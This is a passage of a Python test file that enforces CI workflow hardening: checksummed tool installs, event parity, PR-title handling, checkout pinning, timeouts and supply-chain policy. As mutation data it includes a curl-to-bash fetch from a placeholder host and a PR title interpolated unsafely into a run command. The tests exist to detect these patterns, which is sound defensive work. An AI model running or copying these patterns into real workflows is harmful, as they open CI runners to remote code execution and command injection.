        problems.append("nothing may be piped from curl into a shell or tar (unverified bytes)")
    if "|| true" in script or "set +e" in script or "continue-on-error" in install or "if" in install:
        problems.append("the install step must not swallow a failure or be conditional")
    if lint.get("run") != "actionlint" or "continue-on-error" in lint or "if" in lint or "shell" in lint:
        problems.append(f"the actionlint step must be a plain unconditional `actionlint`: {lint}")
    run = str(control.get("run", ""))
    for needle, why in ((_gates().ACTIONLINT_BAD_FIXTURE, "the bad fixture"),
                        (_gates().ACTIONLINT_NEAR_MISS_FIXTURE, "the near-miss fixture"),
                        (_gates().ACTIONLINT_FINDING, "the finding text"), ("-ne 1", "the exact exit status check")):
        if needle not in run:
            problems.append(f"the bite control lacks {why} ({needle})")
    if "continue-on-error" in control or "if" in control or "|| true" in run:
        problems.append("the bite control must be unconditional and must not swallow a failure")
    commit_steps = jobs["commit-subjects"]["steps"] if "commit-subjects" in jobs else []
    if any("shellcheck" in str(s.get("run", "")) for s in commit_steps):
        problems.append("shellcheck is back in commit-subjects, which does not run on main")
    if not any(s.get("run") == _gates().SHELLCHECK_COMMAND for s in steps):
        problems.append("shellcheck is not a step of static-checks")
    return problems


def _gates():
    return _script("gates")


def test_actionlint_is_installed_from_a_pinned_checksummed_release_and_lints_the_workflows_in_the_static_job():
    jobs = _workflow()["jobs"]
    assert _actionlint_problems(jobs) == []
    env = _step(jobs, STATIC_JOB, "Install actionlint")["env"]
    assert env["ACTIONLINT_VERSION"] == _gates().ACTIONLINT_PINNED_VERSION  # the version gates.py names is the pin
    assert not [s for jid, j in jobs.items() if jid != STATIC_JOB for s in j["steps"]
                if "actionlint" in str(s.get("run", ""))], "actionlint runs in the static job only"
    assert _step(jobs, STATIC_JOB, "Install actionlint")["shell"] == "bash"  # bash -eo pipefail


def test_the_bite_control_runs_in_ci_with_the_fixtures_and_the_finding_that_gates_py_mirrors():
    jobs = _workflow()["jobs"]
    run = _step(jobs, STATIC_JOB, "G1 static — actionlint bite control")["run"]
    gates = _gates()
    for needle in (gates.ACTIONLINT_BAD_FIXTURE, gates.ACTIONLINT_NEAR_MISS_FIXTURE, gates.ACTIONLINT_FINDING):
        assert needle in run, needle
    assert (ROOT / gates.ACTIONLINT_BAD_FIXTURE).is_file() and (ROOT / gates.ACTIONLINT_NEAR_MISS_FIXTURE).is_file()
    bad = yaml_load(FIXTURES / "bad-workflow.yml")
    near = yaml_load(FIXTURES / "near-miss-workflow.yml")
    assert list(bad["jobs"]["probe"]["strategy"]["matrix"]) == ["os"] == list(near["jobs"]["probe"]["strategy"]["matrix"])
    assert "matrix.oss" in str(bad["jobs"]["probe"]["steps"]) and "matrix.oss" not in str(near["jobs"]["probe"]["steps"])
    # the fixtures stay out of the directory the plain `actionlint` run lints
    assert not list((ROOT / ".github" / "workflows").glob("*fixture*")) and FIXTURES.parent.name == "fixtures"
    assert not [p for p in (ROOT / ".github" / "workflows").iterdir() if p.name in {"bad-workflow.yml", "near-miss-workflow.yml"}]


def yaml_load(path: Path) -> dict:
    import yaml

    return yaml.safe_load(path.read_text(encoding="utf-8"))


def test_the_actionlint_checks_bite_on_a_missing_or_late_checksum_a_pipe_and_a_moved_or_softened_step():
    """Near miss green (the real workflow), every violation red, on in-memory copies of the workflow."""
    import copy

    jobs = _workflow()["jobs"]
    assert _actionlint_problems(jobs) == []

    def mutated(edit) -> list[str]:
        copy_ = copy.deepcopy(jobs)
        edit(copy_)
        return _actionlint_problems(copy_)

    install = lambda j: _step(j, STATIC_JOB, "Install actionlint")  # noqa: E731
    lint_step = lambda j: _step(j, STATIC_JOB, "G1 static — actionlint")  # noqa: E731
    control = lambda j: _step(j, STATIC_JOB, "G1 static — actionlint bite")  # noqa: E731

    assert mutated(lambda j: install(j)["env"].update(ACTIONLINT_SHA256="8aca8db9"))  # short digest
    assert mutated(lambda j: install(j)["env"].update(ACTIONLINT_SHA256="G" * 64))  # not hex
    assert mutated(lambda j: install(j)["env"].pop("ACTIONLINT_SHA256"))
    assert mutated(lambda j: install(j)["env"].update(ACTIONLINT_VERSION="latest"))
    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("sha256sum --check --strict -", "cat")))
    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("${ACTIONLINT_SHA256}", "deadbeef")))
    late = lambda j: install(j).update(run="\n".join(sorted(  # noqa: E731
        install(j)["run"].splitlines(), key=lambda ln: ln.lstrip().startswith("echo \"${ACTIONLINT_SHA256}"))))
    assert mutated(late)  # the comparison moved behind the extraction
    assert mutated(lambda j: install(j).update(run=install(j)["run"] + "\ncurl -sL https://example.invalid/x | bash\n"))
    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("--fail ", "")))
    assert mutated(lambda j: install(j).update(run=install(j)["run"].replace("https://", "http://")))
    assert mutated(lambda j: install(j).update(run=install(j)["run"] + "\n|| true\n"))
    assert mutated(lambda j: install(j).update({"continue-on-error": True}))
    assert mutated(lambda j: lint_step(j).update(run="actionlint || true"))
    assert mutated(lambda j: lint_step(j).update(run="actionlint tests/fixtures/actionlint/bad-workflow.yml"))
    assert mutated(lambda j: lint_step(j).update({"if": "github.event_name == 'push'"}))
    assert mutated(lambda j: control(j).update(run=control(j)["run"].replace("-ne 1", "-ne 0")))
    assert mutated(lambda j: control(j).update(run=control(j)["run"].replace("bad-workflow.yml", "other.yml")))
    assert mutated(lambda j: control(j).update(run=control(j)["run"].replace("is not defined in object type", "")))
    assert mutated(lambda j: control(j).update({"continue-on-error": True}))
    assert mutated(lambda j: j[STATIC_JOB]["steps"].remove(control(j)))
    assert mutated(lambda j: j[STATIC_JOB]["steps"].remove(install(j)))
    # shellcheck belongs to the static job (it runs on main) and must not come back to the PR-only job
    assert mutated(lambda j: j[STATIC_JOB]["steps"].remove(
        next(s for s in j[STATIC_JOB]["steps"] if "shellcheck" in str(s.get("run")))))
    assert mutated(lambda j: j["commit-subjects"]["steps"].append(
        {"name": "G1 static — shellcheck", "run": "shellcheck scripts/*.sh scripts/git-hooks/pre-push"}))


# Any reference to the ``github`` context in an ``if:`` can make a job or step depend on the event (github.event_name,
# github.event.*, github.ref, github.head_ref, github.base_ref, github.actor, toJSON(github) ...). An if on status
# functions (always(), !cancelled()), runner.*, matrix.* or needs.* does not, so those stay allowed without a listing.
EVENT_CONTEXT = re.compile(r"\bgithub\b")


def _event_conditional(jobs: dict) -> list[str]:
    """Names of the jobs and steps whose ``if:`` reads the github context: they may run on a pull request but not on a
    push to main (or the other way round)."""
    found = []
    for jid, job in jobs.items():
        if EVENT_CONTEXT.search(str(job.get("if", ""))):
            found.append(f"job {jid}")
        for step in job.get("steps") or []:
            if EVENT_CONTEXT.search(str(step.get("if", ""))):
                found.append(f"step {jid}/{step.get('name') or step.get('uses') or step.get('run')}")
    return found


# The jobs and steps that deliberately differ between a pull request and a push to main. A new entry is a decision:
# the check then does not run on main (this is how shellcheck once ran on pull requests only).
EVENT_CONDITIONAL_ALLOWED = ("job commit-subjects",)


def _parity_problems(jobs: dict) -> list[str]:
    found = _event_conditional(jobs)
    problems = [f"{name} is event-conditional (its if: reads the github context) and not in EVENT_CONDITIONAL_ALLOWED: "
                "it runs on pull requests or on main, not on both" for name in found
                if name not in EVENT_CONDITIONAL_ALLOWED]
    problems += [f"{name} is in EVENT_CONDITIONAL_ALLOWED but no longer event-conditional: remove it"
                 for name in EVENT_CONDITIONAL_ALLOWED if name not in found]
    return problems


def test_only_the_allow_listed_job_differs_between_a_pull_request_and_a_push_to_main():
    jobs = _workflow()["jobs"]
    assert _event_conditional(jobs) == ["job commit-subjects"]
    assert _parity_problems(jobs) == []


def test_the_parity_guard_names_a_new_event_conditional_job_or_step():
    """Near misses green (an if on something else, the real workflow), violations red with the name in the message."""
    import copy

    jobs = _workflow()["jobs"]
    ok = copy.deepcopy(jobs)
    ok[STATIC_JOB]["steps"][3]["if"] = "${{ !cancelled() }}"
    ok["frontend"]["steps"][1]["if"] = "runner.os != 'Windows' && matrix.os != ''"
    ok["browser-e2e"]["if"] = "always()"
    assert _parity_problems(ok) == []

    # other spellings of "pull request only" or "main only" are caught too, not just github.event_name
    for condition in ("github.head_ref != ''", "github.event.pull_request.number", "github.ref == 'refs/heads/main'",
                      "${{ github.base_ref }}", "contains(toJSON(github), 'pull_request')"):
        for where, name in (("job", "job frontend"), ("step", "step frontend/")):
            other = copy.deepcopy(jobs)
            target = other["frontend"] if where == "job" else other["frontend"]["steps"][1]
            target["if"] = condition
            problems = _parity_problems(other)
            assert len(problems) == 1 and name in problems[0], (condition, where, problems)

    on_step = copy.deepcopy(jobs)
    step = _step(on_step, STATIC_JOB, "G1 static — actionlint")
    step["if"] = "${{ github.event_name == 'pull_request' }}"
    (problem,) = _parity_problems(on_step)
    assert "step static-checks/G1 static — actionlint" in problem

    on_job = copy.deepcopy(jobs)
    on_job["browser-e2e"]["if"] = "github.event_name != 'push'"
    (problem,) = _parity_problems(on_job)
    assert "job browser-e2e" in problem

    unlabeled = copy.deepcopy(jobs)
    unlabeled["frontend"]["steps"][1]["if"] = "github.event_name == 'push'"
    assert any("frontend" in p for p in _parity_problems(unlabeled))

    stale = copy.deepcopy(jobs)
    del stale["commit-subjects"]["if"]
    (problem,) = _parity_problems(stale)
    assert "job commit-subjects" in problem and "no longer" in problem


# ------------------------------------------------------------------ every workflow file (ci.yml and pr-title.yml)
WORKFLOWS_DIR = ROOT / ".github" / "workflows"


def _workflow_files() -> dict[str, dict]:
    return {p.name: yaml_load(p) for p in sorted(WORKFLOWS_DIR.glob("*.y*ml"))}


def _all_jobs(doc: dict) -> dict:
    return doc["jobs"]


# Rules that apply to every workflow file (full-SHA pins, read-only token, no pull_request_target, a timeout on every
# job, no macOS runner outside ci.yml, no github.* expression in run:) have one owner: tests/unit/test_delivery_ci_secrets.py.


PR_TITLE_JOB = "pr-title"


def _pr_title_problems(doc: dict) -> list[str]:
    """What is wrong with pr-title.yml (a parsed workflow), the parts that are specific to it: the five pull_request
    event types plus a push to main (where the job is skipped), the pull_request guard on the job,
    one ubuntu job named ``pr title [G1]`` with a 5-minute timeout and the same checkout as ci.yml without ``with:``,
    and the title reaching the script through ``env:`` only. The all-workflow rules (pins, token, timeouts) are owned
    by tests/unit/test_delivery_ci_secrets.py."""
    problems = []
    on = doc.get("on", doc.get(True)) or {}
    if set(on) != {"pull_request", "push"} or set(on["pull_request"]["types"]) != {
            "opened", "edited", "synchronize", "reopened", "ready_for_review"} or on["push"] != {"branches": ["main"]}:
        problems.append(f"on: {on}")
    jobs = _all_jobs(doc)
    if list(jobs) != [PR_TITLE_JOB]:
        return problems + [f"jobs {list(jobs)}"]
    job = jobs[PR_TITLE_JOB]
    if job.get("name") != "pr title [G1]":
        problems.append(f"name {job.get('name')!r}")
    if job.get("runs-on") != "ubuntu-latest":
        problems.append(f"runs-on {job.get('runs-on')!r} (a macOS slot is scarce, the check is platform-neutral)")
    if job.get("timeout-minutes") != 5:
        problems.append(f"timeout-minutes {job.get('timeout-minutes')!r}")
    # The job is skipped on the push to main so that the required context "pr title [G1]" has a (skipped, OK) check run
    # on every merge commit: ci_status.py --after-merge would stay PENDING for ever without it.
    if job.get("if") != "github.event_name == 'pull_request'":
        problems.append(f"job-level if must be exactly the pull_request guard: {job.get('if')!r}")
    if "continue-on-error" in job or "permissions" in job:
        problems.append("job-level continue-on-error / permissions")
    steps = job["steps"]
    checkout = steps[0]
    if not str(checkout.get("uses", "")).startswith("actions/checkout@") or checkout.get("with"):
        problems.append(f"first step must be a plain actions/checkout: {checkout}")
    if checkout.get("uses") != _workflow()["jobs"]["static-checks"]["steps"][0]["uses"]:
        problems.append("checkout is not the same pinned SHA as ci.yml")
    runs = [s for s in steps if "run" in s]
    if len(runs) != 1:
        return problems + [f"expected exactly one run step, found {len(runs)}"]
    run = runs[0]
    if (run.get("env") or {}) != {"PR_TITLE": "${{ github.event.pull_request.title }}"}:
        problems.append(f"the title must reach the step as env PR_TITLE only: {run.get('env')}")
    if run.get("run") != 'python3 scripts/commit_subject.py --subject="$PR_TITLE"' or "if" in run or "continue-on-error" in run:
        problems.append(f"run: {run.get('run')!r}")
    return problems


def test_pr_title_workflow_checks_the_title_as_a_commit_subject_with_the_title_only_in_env():
    from aeos.delivery.provider import classify_check

    doc = _workflow_files()["pr-title.yml"]
    assert _pr_title_problems(doc) == []
    text = (WORKFLOWS_DIR / "pr-title.yml").read_text(encoding="utf-8")
    code_lines = [ln for ln in text.splitlines() if not ln.lstrip().startswith("#")]
    assert sum("github.event.pull_request.title" in ln for ln in code_lines) == 1  # the env line, nowhere else
    assert classify_check("pr title [G1]") == ["G1"]
    assert "pr title [G1]" in REQUIRED_CHECKS  # required since the merge policy of ADR-0115 (2026-10-27)
    assert "pr title [G1]" not in [n for job in _workflow()["jobs"].values() for n in _check_names(job)]


def test_the_pr_title_checks_bite_on_each_unsafe_or_weakened_shape():
    import copy

    doc = _workflow_files()["pr-title.yml"]
    assert _pr_title_problems(doc) == []

    def mutated(edit) -> list[str]:
        copy_ = copy.deepcopy(doc)
        edit(copy_)
        return _pr_title_problems(copy_)

    job = lambda d: d["jobs"][PR_TITLE_JOB]  # noqa: E731
    _on = lambda d: d.get("on", d.get(True))  # noqa: E731  (PyYAML reads the bare key `on` as True)
    assert mutated(lambda d: job(d)["steps"][1].update(run="python3 scripts/commit_subject.py --subject \"${{ github.event.pull_request.title }}\""))
    assert mutated(lambda d: job(d)["steps"][1].update(run='python3 scripts/commit_subject.py --subject "$PR_TITLE"'))
    assert mutated(lambda d: job(d)["steps"][1].update(env={}))
    assert mutated(lambda d: job(d)["steps"][1].update(env={"PR_TITLE": "${{ github.event.pull_request.body }}"}))
    assert mutated(lambda d: job(d)["steps"][1].update({"continue-on-error": True}))
    assert mutated(lambda d: job(d).update({"timeout-minutes": 30}))
    assert mutated(lambda d: job(d).pop("timeout-minutes"))
    assert mutated(lambda d: job(d).update({"runs-on": "macos-latest"}))
    assert mutated(lambda d: job(d).update({"name": "pr title"}))
    assert mutated(lambda d: job(d).update({"if": "github.event.action == 'edited'"}))
    assert mutated(lambda d: job(d).pop("if"))  # a push to main would run the title check on no title
    assert mutated(lambda d: _on(d).pop("push"))  # no check run on the merge commit: --after-merge stays PENDING
    assert mutated(lambda d: _on(d).update({"push": {"branches": ["main", "release"]}}))
    assert mutated(lambda d: _on(d).update({"push": {"tags": ["v*"]}}))
    assert mutated(lambda d: job(d)["steps"][0].update(uses="actions/checkout@v7"))
    assert mutated(lambda d: job(d)["steps"][0].update({"with": {"ref": "main"}}))
    assert mutated(lambda d: _on(d).update({"pull_request": {"types": ["opened"]}}))
    assert mutated(lambda d: d.update({True: {"pull_request_target": {"types": ["opened", "edited", "synchronize",
                                                                               "reopened", "ready_for_review"]},
                                              "push": {"branches": ["main"]}}}))


# The checkout and setup of every backend job (static, shards, verifier) must build the commit under test: an
# `actions/checkout` `with:` key such as ref, repository, path, sparse-checkout or token could point G1 or a shard at
# another commit (for example main) while every test stays green.
BACKEND_JOB_PREFIXES = ("static-checks", "backend-shards-", "backend-verifier-")
SETUP_STEPS = 3  # checkout, setup-python, install


def _checkout_problems(jobs: dict) -> list[str]:
    problems = []
    backend = {jid: j for jid, j in jobs.items() if jid.startswith(BACKEND_JOB_PREFIXES)}
    for jid, job in backend.items():
        checkouts = [s for s in job["steps"] if str(s.get("uses", "")).startswith("actions/checkout@")]
        if len(checkouts) != 1 or job["steps"][0] is not checkouts[0]:
            problems.append(f"{jid}: needs exactly one actions/checkout, as the first step")
        for step in checkouts:
            if step.get("with"):
                problems.append(f"{jid}: actions/checkout has with: {sorted(step['with'])}")
    reference = _shard_jobs(jobs).get("backend-shards-windows-latest", {}).get("steps", [])[:SETUP_STEPS]
    for jid in ("static-checks", *sorted(_shard_jobs(jobs)), "backend-verifier-macos-latest"):
        if backend.get(jid, {}).get("steps", [])[:SETUP_STEPS] != reference:
            problems.append(f"{jid}: checkout / setup-python / install differ from the shard jobs")
    return problems


def test_no_backend_job_checks_out_anything_but_the_commit_under_test_and_all_set_up_the_same_way():
    jobs = _workflow()["jobs"]
    assert _checkout_problems(jobs) == []
    first = _shard_jobs(jobs)["backend-shards-windows-latest"]["steps"][:SETUP_STEPS]
    assert [str(s.get("uses") or s.get("name")).split("@")[0] for s in first] == [
        "actions/checkout", "actions/setup-python", "Install (universal lockfile, ADR-0093)"]


def test_the_checkout_check_bites_on_a_ref_a_foreign_install_and_a_missing_checkout():
    import copy

    jobs = _workflow()["jobs"]
    assert _checkout_problems(jobs) == []
    for jid in ("static-checks", "backend-shards-macos-latest", "backend-verifier-macos-latest"):
        for key, value in (("ref", "main"), ("repository", "someone/else"), ("path", "sub"), ("sparse-checkout", "tests")):
            mutated = copy.deepcopy(jobs)
            mutated[jid]["steps"][0]["with"] = {key: value}
            assert _checkout_problems(mutated), (jid, key)
    other_python = copy.deepcopy(jobs)
    other_python["static-checks"]["steps"][1]["with"]["python-version"] = "3.12"
    assert _checkout_problems(other_python)
    other_install = copy.deepcopy(jobs)
    other_install["static-checks"]["steps"][2]["run"] = "python -m pip install ruff"
    assert _checkout_problems(other_install)
    missing = copy.deepcopy(jobs)
    del missing["backend-shards-windows-latest"]["steps"][0]
    assert _checkout_problems(missing)


def test_each_shard_uploads_its_junit_report_for_rebalancing():
    first = next(iter(_shard_jobs().values()))["steps"]
    (upload,) = [s for s in first if str(s.get("uses", "")).startswith("actions/upload-artifact@")]
    assert upload["with"]["path"] == "junit-backend.xml" and upload["if"] == "${{ !cancelled() }}"
    assert upload["with"]["name"] == "junit-backend-${{ matrix.os }}-shard-${{ matrix.shard }}"
    assert upload["with"]["retention-days"] == 14


def test_the_real_trusted_suite_verifier_runs_in_its_own_macos_arm64_job():
    jobs = _workflow()["jobs"]
    job = jobs["backend-verifier-macos-latest"]
    assert job["runs-on"] == "macos-latest" and "[G2]" in job["name"]
    (step,) = [s for s in job["steps"] if s.get("name") == "G2 verifier runs the trusted suite for real (git only)"]
    assert step["run"] == "python -m pytest -q -m integration tests/integration/test_verification_real_suite.py"
    assert "if" not in step and "if" not in job  # never skipped (a skipped step would still pass the job)


def _timeout_cap_problems(jobs: dict) -> list[str]:
    """The exact per-job cap; the generic 1..25 bound for every workflow is owned by test_delivery_ci_secrets."""
    caps = {"static-checks": 15, "backend-shards-": 25, "backend-verifier-": 20, "frontend": 15, "browser-e2e": 20,
            "bootstrap": 15, "supply-chain": 20}
    problems = []
    for jid, job in jobs.items():
        timeout = job.get("timeout-minutes")
        expected = next((v for k, v in caps.items() if jid.startswith(k)), 5)  # the rest are the aggregators
        if timeout != expected or isinstance(timeout, bool):
            problems.append(f"job {jid}: timeout-minutes is {timeout!r}, expected {expected}")
    return problems


def test_every_job_has_a_timeout_so_a_hung_runner_cannot_hold_a_macos_slot_for_six_hours():
    """The default is 360 minutes; GitHub Free has 5 account-wide macOS slots."""
    assert _timeout_cap_problems(_workflow()["jobs"]) == []


def test_the_timeout_cap_check_bites_on_a_missing_wrong_or_boolean_value_and_passes_the_exact_cap():
    import copy

    jobs = copy.deepcopy(_workflow()["jobs"])
    jid = "static-checks"
    assert jid in jobs and _timeout_cap_problems(jobs) == []  # near miss: the exact caps are green
    missing = copy.deepcopy(jobs)
    del missing[jid]["timeout-minutes"]
    assert _timeout_cap_problems(missing) == [f"job {jid}: timeout-minutes is None, expected 15"]
    wrong = copy.deepcopy(jobs)
    wrong[jid]["timeout-minutes"] = 16
    assert _timeout_cap_problems(wrong) == [f"job {jid}: timeout-minutes is 16, expected 15"]
    string = copy.deepcopy(jobs)
    string[jid]["timeout-minutes"] = "15"
    assert _timeout_cap_problems(string) == [f"job {jid}: timeout-minutes is '15', expected 15"]


def test_only_pull_request_runs_are_cancelled_by_a_newer_run():
    """A main push run is never cancelled (each merge commit needs its own CI PASS for `aeos ops release accept`):
    cancel-in-progress is true for pull requests only and every push run has a group of its own (a pending run
    in a shared group would be replaced by the next one even without cancel-in-progress)."""
    c = _workflow()["concurrency"]
    assert c["cancel-in-progress"] == "${{ github.event_name == 'pull_request' }}"
    assert c["group"] == "ci-${{ github.event_name == 'pull_request' && github.ref || github.run_id }}"


def test_dependency_and_browser_caches_are_keyed_on_lockfiles_and_versions():
    """pip caches keyed on requirements.lock, npm caches where npm ci runs (directly or in the bootstrap), and the
    Playwright browsers keyed by the pinned Playwright version. Only package/browser downloads are cached."""
    jobs = _workflow()["jobs"]
    python_jobs = 0
    for jid, job in jobs.items():
        steps = job.get("steps") or []
        runs = "\n".join(s.get("run") or "" for s in steps)
        for step in steps:
            uses = str(step.get("uses") or "")
            if uses.startswith("actions/setup-python@"):
                python_jobs += 1
                assert step["with"].get("cache") == "pip", jid
                assert step["with"].get("cache-dependency-path") == "requirements.lock", jid
            if uses.startswith("actions/cache@"):
                assert step["with"]["path"] == "~/.cache/ms-playwright", (jid, step["with"]["path"])
                assert step["with"]["key"].endswith("${{ steps.playwright.outputs.version }}")
        if "npm ci" in runs or "scripts/bootstrap" in runs or "bootstrap.ps1" in runs:
            node = [s for s in steps if str(s.get("uses") or "").startswith("actions/setup-node@")]
            assert node and node[0]["with"].get("cache") == "npm", jid
            assert node[0]["with"].get("cache-dependency-path") == "frontend/package-lock.json", jid
    assert python_jobs >= 7
    e2e = jobs["browser-e2e"]["steps"]
    order = [str(s.get("uses") or s.get("run") or "") for s in e2e]
    cache_at = next(i for i, s in enumerate(order) if s.startswith("actions/cache@"))
    install_at = next(i for i, s in enumerate(order) if "playwright install --with-deps chromium" in s)
    assert cache_at < install_at, "the browser cache is restored before the install"


def test_every_teed_report_step_runs_with_pipefail():
    """GitHub's default `bash -e {0}` has no pipefail: `tool | tee` reported success even when the tool crashed.
    `shell: bash` runs `bash --noprofile --norc -eo pipefail {0}`."""
    teed = []
    for job_id, job in _workflow()["jobs"].items():
        default_shell = ((job.get("defaults") or {}).get("run") or {}).get("shell")
        for step in job.get("steps") or []:
            run = step.get("run") or ""
            if "| tee" in run:
                teed.append(job_id)
                assert (step.get("shell") or default_shell) == "bash", (job_id, step.get("name"))
    assert "supply-chain" in teed and "browser-e2e" in teed


def test_supply_chain_job_evaluates_the_owner_policy_and_hard_codes_no_threshold():
    job = _workflow()["jobs"]["supply-chain"]
    runs = "\n".join(s.get("run") or "" for s in job["steps"])
    assert "scripts/supply_chain.py evaluate --policy policy/supply-chain.yaml" in runs
    for report in ("pip-audit.json", "npm-audit.json", "bandit.json", "licenses.json"):
        assert report in runs, report
    assert "--audit-level" not in runs and " -ll" not in runs, "severity filtering is the owner's threshold"
    evaluation = next(s for s in job["steps"] if "evaluate --policy" in (s.get("run") or ""))
    assert not evaluation.get("continue-on-error"), "once decided, a violation fails the job"
    assert "[NO-GATE]" in job["name"]  # until the owner decides (policy UNDECIDED)


SAMPLE_PIP = {"dependencies": [{"name": "jinja2", "version": "3.1.0", "vulns": [
    {"id": "PYSEC-X", "fix_versions": ["3.1.6"], "aliases": [], "description": "x"}]},
    {"name": "fastapi", "version": "0.1", "vulns": []}], "fixes": []}
SAMPLE_NPM = {"auditReportVersion": 2, "vulnerabilities": {
    "esbuild": {"name": "esbuild", "severity": "moderate", "range": "<0.25"},
    "vite": {"name": "vite", "severity": "high", "range": "<6"}}, "metadata": {}}
SAMPLE_BANDIT = {"results": [
    {"test_id": "B603", "filename": "a.py", "line_number": 1, "issue_severity": "LOW", "issue_confidence": "HIGH"},
    {"test_id": "B608", "filename": "b.py", "line_number": 2, "issue_severity": "MEDIUM", "issue_confidence": "LOW"}],
    "errors": []}


def _reports(tmp_path: Path, **override) -> dict:
    files = {"pip_audit": SAMPLE_PIP, "npm_audit": SAMPLE_NPM, "bandit": SAMPLE_BANDIT,
             "licenses": {"items": [{"name": "fastapi", "license": "MIT"}], "unknown": []}} | override
    out = {}
    for key, data in files.items():
        if data is None:
            out[key] = str(tmp_path / f"{key}-missing.json")
            continue
        p = tmp_path / f"{key}.json"
        p.write_text(data if isinstance(data, str) else json.dumps(data), encoding="utf-8")
        out[key] = str(p)
    return out


def _policy(tmp_path: Path, body: str) -> Path:
    p = tmp_path / "supply-chain.yaml"
    p.write_text(body, encoding="utf-8")
    return p


DECIDED = """status: DECIDED
decision_ref: ADR-0095
licenses: {allow: [MIT, Apache-2.0]}
vulnerabilities:
  python: {fail_at_or_above: HIGH}
  npm: {fail_at_or_above: HIGH}
sast:
  bandit: {fail_at_or_above: MEDIUM, min_confidence: MEDIUM}
"""


def test_the_repository_policy_is_undecided_and_invents_no_value():
    sc = _script("supply_chain")
    pol = sc.load_policy(ROOT / "policy" / "supply-chain.yaml")
    assert pol["status"] == "UNDECIDED" and not pol["errors"]
    assert pol["licenses_allow"] is None and pol["min_confidence"] is None
    assert set(pol["thresholds"].values()) == {None}


def test_undecided_policy_is_report_only_even_with_findings_and_crashed_scans(tmp_path: Path):
    sc = _script("supply_chain")
    pol = sc.load_policy(ROOT / "policy" / "supply-chain.yaml")
    res = sc.evaluate(pol, **_reports(tmp_path, bandit=None, npm_audit="{not json"))
    assert res["mode"] == "REPORT_ONLY" and res["overall"] == "REPORT_ONLY"
    assert res["sections"]["bandit"]["report"] == "MISSING", "a crashed scan is never 'no findings'"
    assert res["sections"]["npm"]["report"] == "UNREADABLE"
    assert res["sections"]["python"]["counts"] == {"UNKNOWN": 1}  # pip-audit reports no severity: never guessed
    out = tmp_path / "eval.json"
    args = ["evaluate", "--policy", str(ROOT / "policy" / "supply-chain.yaml"), "-o", str(out)]
    for key, flag in (("pip_audit", "--pip-audit"), ("npm_audit", "--npm-audit"), ("bandit", "--bandit")):
        args += [flag, _reports(tmp_path)[key]]
    assert sc.main(args) == 0
    assert json.loads(out.read_text(encoding="utf-8"))["mode"] == "REPORT_ONLY"


def test_the_step_summary_lists_what_was_found_not_only_counts(tmp_path: Path):
    """The scanner output no longer goes to the step summary directly (JSON for the evaluator), so the evaluation
    summary must name each finding - a report-only run is useless if it only says 'counts={UNKNOWN: 1}'."""
    sc = _script("supply_chain")
    res = sc.evaluate(sc.load_policy(ROOT / "policy" / "supply-chain.yaml"), **_reports(tmp_path))
    text = "\n".join(sc.summary_lines(res))
    assert "jinja2 3.1.0 PYSEC-X severity=UNKNOWN" in text
    assert "vite <6 severity=HIGH" in text and "esbuild <0.25 severity=MEDIUM" in text
    assert "B608 b.py:2 severity=MEDIUM confidence=LOW" in text


def test_decided_policy_fails_on_violations_unknown_severity_and_missing_reports(tmp_path: Path):
    sc = _script("supply_chain")
    pol = sc.load_policy(_policy(tmp_path, DECIDED))
    assert not pol["errors"] and pol["thresholds"] == {"python": "HIGH", "npm": "HIGH", "bandit": "MEDIUM"}
    res = sc.evaluate(pol, **_reports(tmp_path))
    assert res["mode"] == "ENFORCED" and res["overall"] == "FAIL"
    s = res["sections"]
    assert [v["package"] for v in s["npm"]["violations"]] == ["vite"]  # moderate esbuild is below HIGH
    assert s["python"]["status"] == "FAIL", "an UNKNOWN severity cannot be shown below the threshold"
    assert s["bandit"]["status"] == "PASS"  # LOW < MEDIUM; the MEDIUM one is below min_confidence
    assert s["licenses"]["status"] == "PASS"
    clean = sc.evaluate(pol, **_reports(tmp_path, pip_audit={"dependencies": []},
                                        npm_audit={"vulnerabilities": {}, "metadata": {}}))
    assert clean["overall"] == "PASS"
    missing = sc.evaluate(pol, **_reports(tmp_path, pip_audit={"dependencies": []}, npm_audit=None))
    assert missing["overall"] == "FAIL" and missing["sections"]["npm"]["report"] == "MISSING"
    args = ["evaluate", "--policy", str(_policy(tmp_path, DECIDED))]
    for key, flag in (("pip_audit", "--pip-audit"), ("npm_audit", "--npm-audit"), ("bandit", "--bandit"),
                      ("licenses", "--licenses")):
        args += [flag, _reports(tmp_path)[key]]
    assert sc.main(args) == 1


def test_decided_licence_allow_list_fails_unknown_and_unlisted_licences(tmp_path: Path):
    sc = _script("supply_chain")
    allow = ["MIT", "Apache-2.0"]
    assert sc.licence_allowed("MIT", allow) and sc.licence_allowed("apache-2.0", allow)
    assert sc.licence_allowed("MIT OR GPL-3.0-only", allow) and not sc.licence_allowed("MIT AND GPL-3.0-only", allow)
    assert sc.licence_allowed("(MIT OR BSD-3-Clause) AND Apache-2.0", allow)
    assert not sc.licence_allowed("UNKNOWN", allow) and not sc.licence_allowed("MIT License", allow)  # never mapped
    assert not sc.licence_allowed("(MIT", allow) and not sc.licence_allowed("", allow)
    pol = sc.load_policy(_policy(tmp_path, DECIDED))
    rep = {"items": [{"name": "a", "license": "MIT"}, {"name": "b", "license": "UNKNOWN"},
                     {"name": "c", "license": "GPL-3.0-only"}], "unknown": ["b"]}
    sec = sc.evaluate_licenses(rep, pol)
    assert sec["status"] == "FAIL" and {v["name"]: v["reason"] for v in sec["violations"]} == {
        "b": "UNKNOWN licence", "c": "not in licenses.allow"}
    live = sc.license_report(pol)
    assert live["status"] in ("PASS", "FAIL") and live["policy"]["status"] == "DECIDED"
    assert sc.license_report(sc.load_policy(ROOT / "policy" / "supply-chain.yaml"))["status"] == "REPORT_ONLY"


def test_a_malformed_decided_policy_fails_closed(tmp_path: Path):
    sc = _script("supply_chain")
    bad = sc.load_policy(_policy(tmp_path, "status: DECIDED\nvulnerabilities: {python: {fail_at_or_above: SOMEWHAT}}\n"))
    assert bad["errors"] and sc.evaluate(bad, **_reports(tmp_path))["overall"] == "POLICY_INVALID"
    assert sc.main(["evaluate", "--policy", str(_policy(tmp_path, "status: DECIDED\n"))]) == 2  # no decision_ref
    assert any("decision_ref" in e for e in sc.load_policy(_policy(tmp_path, "status: DECIDED\n"))["errors"])


@pytest.mark.parametrize("body", [None, "status: [DECIDED\n", "- just\n- a list\n"])
def test_a_missing_or_unreadable_policy_file_fails_closed_never_undecided(tmp_path: Path, body):
    """A decided policy that got deleted or broken must not quietly turn the gate back into a report."""
    sc = _script("supply_chain")
